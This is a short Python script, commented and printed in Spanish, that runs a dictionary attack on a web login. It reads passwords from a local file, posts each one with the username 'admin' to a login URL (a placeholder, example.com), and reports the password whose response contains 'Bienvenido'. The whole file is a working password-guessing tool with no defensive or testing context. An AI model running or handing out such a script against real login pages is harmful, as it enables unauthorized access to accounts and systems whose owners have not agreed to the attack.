import requests

URL = "https://example.com/login"   
USUARIO = "admin"                   

def leer_contrasenas():
    try:
        with open("contraseñas.txt", "r") as f:
            return [c.strip() for c in f if c.strip()]
    except FileNotFoundError:
        print("No se encontró 'contraseñas.txt'")
        return []

def probar(contrasenas):
    for c in contrasenas:
        try:
            r = requests.post(URL, data={"username": USUARIO, "password": c})
            if r.status_code == 200 and "Bienvenido" in r.text:
                print("Login exitoso con:", c)
                return
            else:
                print("Falló con:", c)
        except Exception as e:
            print("Error de conexión:", e)
            break

def main():
    print("Probando contraseñas...")
    contrasenas = leer_contrasenas()
    if contrasenas:
        probar(contrasenas)

if __name__ == "__main__":
    main()